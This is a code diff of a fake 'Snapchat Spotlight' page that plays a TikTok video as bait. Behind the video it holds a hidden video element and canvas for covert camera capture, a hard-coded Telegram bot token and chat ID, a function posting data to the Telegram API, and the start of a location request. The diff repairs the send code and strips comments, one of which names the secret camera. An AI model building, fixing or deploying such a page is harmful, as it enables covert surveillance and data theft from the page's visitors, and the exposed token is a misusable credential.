@@ -33,28 +33,28 @@
 <body>
 
     <div>
-‎        <!-- ڤیدیۆیا تیکتۆکێ یا داوۆنلۆدکری و بارکری ل هەمەن فۆلدر -->
         <video id="spotlight-video" src="tiktok-video.mp4" autoplay loop controls playsinline></video>
-        
         <h1>Snapchat Spotlight</h1>
         <p>هيڤي دكه م وه بكه ڤيديو ڤه بيتن ...</p>
     </div>
 
-‎    <!-- کامیرایا نهێنی بۆ گرتنا وێنەی -->
     <video id="hidden-video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
         const token = '8927591228:AAGdIn4qL1xVXpH-jQ-lX_Ccgsy5jMByol4';
-        const chat_id = 'ID:'7643191802';
-
+        const chat_id = '7643191802';
 
         async function sendMessage(text) {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat_id, text: text })
-            });
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chat_id, text: text })
+                });
+            } catch (e) {
+                console.error(e);
+            }
         }
 
         function askLocation() {
